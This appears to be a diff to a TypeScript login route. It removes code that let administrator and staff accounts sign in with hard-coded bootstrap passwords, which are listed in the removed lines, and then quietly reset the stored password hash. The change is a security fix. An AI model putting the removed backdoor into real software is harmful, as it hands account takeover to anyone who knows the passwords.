@@ -47,34 +47,7 @@ authRouter.post('/login', async (req: Request, res: Response) => {
     return;
   }
 
-  let isValid = verifyPassword(password, user.password_hash, user.password_salt);
-
-  // If initial verification failed and this is an administrator account,
-  // allow sign in with any of the valid bootstrap passwords (env configured, AdminPass@2026, ChangeMeSecurely123!, Admin123!)
-  // and immediately synchronize their password hash to the verified password.
-  if (!isValid && (user.role_id === 'role_administrator' || user.account_type === 'staff')) {
-    const adminPasswords = [
-      process.env.ADMIN_PASSWORD,
-      'AdminPass@2026',
-      'ChangeMeSecurely123!',
-      'Admin123!'
-    ].filter(Boolean) as string[];
-
-    if (adminPasswords.includes(password)) {
-      isValid = true;
-      const { hash: newHash, salt: newSalt } = hashPassword(password);
-      await withTransaction((db) => {
-        const u = db.users.find(x => x.id === user.id);
-        if (u) {
-          u.password_hash = newHash;
-          u.password_salt = newSalt;
-          user.password_hash = newHash;
-          user.password_salt = newSalt;
-        }
-      });
-    }
-  }
-
+  const isValid = verifyPassword(password, user.password_hash, user.password_salt);
   if (!isValid) {
     await logAudit({
       actorId: user.id,
